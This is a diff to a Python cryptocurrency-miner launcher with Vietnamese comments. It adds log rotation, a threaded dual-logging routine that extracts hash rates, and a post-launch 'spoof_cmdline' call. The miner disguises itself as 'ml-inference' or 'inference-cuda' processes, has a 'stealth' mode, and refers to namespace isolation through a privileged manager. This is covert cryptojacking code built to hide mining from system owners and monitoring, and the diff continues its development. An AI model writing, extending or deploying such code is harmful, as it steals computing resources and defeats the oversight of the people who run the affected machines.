@@ -13,6 +13,7 @@ import time
 import re
 import logging
 from pathlib import Path
+from datetime import datetime
 
 # Thêm thư mục script vào sys.path để **resolve** (phân giải) các **local module imports** (import module cục bộ)
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -140,10 +141,70 @@ def stop_system_manager():
 def is_mining_process_running(process):
     return process and process.poll() is None
 
+def rotate_log_file(log_path, max_size_mb=50):
+    """
+    **Log rotation** (xoay vòng log) để tránh **disk space issues** (vấn đề dung lượng đĩa)
+    """
+    if not os.path.exists(log_path):
+        return
+        
+    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
+    if file_size_mb > max_size_mb:
+        backup_path = f"{log_path}.backup"
+        if os.path.exists(backup_path):
+            os.remove(backup_path)
+        os.rename(log_path, backup_path)
+        logger.info(f"Log file rotated: {log_path} -> {backup_path}")
+
+def dual_logger_thread(process, log_file, process_name, log_lock):
+    """
+    **Thread-safe dual logging** (ghi log kép an toàn luồng) - ghi vào **file** (tệp) và **terminal** (thiết bị đầu cuối)
+    """
+    try:
+        while True:
+            line = process.stdout.readline()
+            if not line:
+                break
+                
+            # **Thread-safe logging** (ghi log an toàn luồng)
+            with log_lock:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                formatted_line = f"[{timestamp}][{process_name}] {line.strip()}"
+                
+                # **Write to file** (ghi vào tệp)
+                log_file.write(f"{formatted_line}\n".encode())
+                log_file.flush()
+                
+                # **Print to terminal** (in ra thiết bị đầu cuối)
+                print(formatted_line)
+                
+                # **Extract hash rate** (trích xuất tốc độ băm) from **mining output** (đầu ra khai thác)
+                hash_rate_match = re.search(r'(\d+\.\d+)\s*(H/s|KH/s|MH/s|GH/s)', line)
+                if hash_rate_match:
+                    hash_rate = float(hash_rate_match.group(1))
+                    unit = hash_rate_match.group(2)
+                    
+                    # **Convert to H/s** (chuyển đổi sang H/s)
+                    if unit == 'KH/s':
+                        hash_rate *= 1000
+                    elif unit == 'MH/s':
+                        hash_rate *= 1000000
+                    elif unit == 'GH/s':
+                        hash_rate *= 1000000000
+                    
+                    # **Log hash rate** (ghi log tốc độ băm) với **simple format** (định dạng đơn giản)
+                    log_hash_rate(process_name, hash_rate)
+                    
+    except Exception as e:
+        logger.error(f"Lỗi trong dual_logger_thread: {e}")
+    finally:
+        if log_file:
+            log_file.close()
+
 def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     """
-    Khởi động **mining process** (quy trình khai thác) với **stealth capabilities** (khả năng ẩn danh) cho **ml-inference** (suy luận máy học).
-    Hỗ trợ cả **traditional subprocess** (tiến trình con truyền thống) và **OptimizedCalculationChain** (chuỗi tính toán được tối ưu hóa).
+    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi log kép), 
+    **log rotation** (xoay vòng log), và **thread-safe logging** (ghi log an toàn luồng).
     """
     executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
@@ -160,7 +221,12 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
 
     miner_tag = 'cpu' if cpu else 'gpu'
     miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
-    miner_log_file = open(miner_log_path, 'ab', buffering=0)
+    
+    # **Log rotation** (xoay vòng log) trước khi khởi chạy
+    rotate_log_file(str(miner_log_path))
+    
+    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi log kép)
+    log_lock = threading.Lock()
 
     # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên)
     process_name = "ml-inference" if cpu else "inference-cuda"
@@ -181,21 +247,41 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     for attempt in range(1, retries + 1):
         logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
         try:
+            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth and cpu:
-                # Sử dụng **stealth subprocess** (tiến trình con ẩn danh) cho **CPU mining** (khai thác CPU) - **ml-inference** (suy luận máy học)
-                process = create_stealth_subprocess(
+                # **Stealth subprocess** (tiến trình con ẩn danh) - **modified for dual logging** (sửa đổi cho ghi log kép)
+                process = subprocess.Popen(
                     mining_command,
-                    fake_name=process_name,
-                    stdout=miner_log_file,
+                    stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
+                    universal_newlines=True,
                     bufsize=1
                 )
                 if process:
-                    logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
+                    # **Spoof process name** (giả mạo tên tiến trình) sau khi khởi chạy
+                    try:
+                        spoof_cmdline(process.pid, process_name)
+                        logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
+                    except Exception as e:
+                        logger.warning(f"⚠️ Không thể spoof cmdline: {e}")
             elif enable_ns and privileged_manager:
-                process = privileged_manager.create_namespace_isolation(mining_command)
+                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
+                process = subprocess.Popen(
+                    mining_command,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    universal_newlines=True,
+                    bufsize=1
+                )
             else:
-                process = subprocess.Popen(mining_command, stdout=miner_log_file, stderr=subprocess.STDOUT, bufsize=1)
+                # **Standard subprocess** (tiến trình con tiêu chuẩn)
+                process = subprocess.Popen(
+                    mining_command,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    universal_newlines=True,
+                    bufsize=1
+                )
             
             if process:
                 logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")
@@ -203,33 +289,29 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                 register_mining_process(process_name, process.pid, process)
                 
-                # **Log mining operation** (ghi log thao tác khai thác)
-                log_mining_operation(
-                    process_type=process_name,
-                    operation="START",
-                    pid=process.pid,
-                    details={
-                        "command": mining_command,
-                        "stealth_mode": enable_stealth and cpu,
-                        "namespace_isolation": enable_ns and privileged_manager is not None
-                    }
-                )
+                # **Simple operation logging** (ghi log thao tác đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
+                logger.info(f"START: {process_name} PID={process.pid} CMD={' '.join(mining_command)}")
                 
-                # **Start log monitoring** (bắt đầu giám sát log) cho **hash rate extraction** (trích xuất tốc độ băm)
+                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
+                log_file = open(miner_log_path, 'ab', buffering=0)
+                
+                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
+                log_thread = threading.Thread(
+                    target=dual_logger_thread,
+                    args=(process, log_file, process_name, log_lock),
+                    daemon=True
+                )
+                log_thread.start()
+                
+                # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                 mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                 
                 time.sleep(2)
                 if process.poll() is not None:
                     logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                     
-                    # **Log early termination** (ghi log kết thúc sớm)
-                    log_mining_operation(
-                        process_type=process_name,
-                        operation="EARLY_TERMINATION",
-                        pid=process.pid,
-                        details={"return_code": process.returncode},
-                        status="FAILED"
-                    )
+                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
+                    logger.error(f"EARLY_TERMINATION: {process_name} PID={process.pid} EXIT_CODE={process.returncode}")
                     process = None
                 else:
                     return process
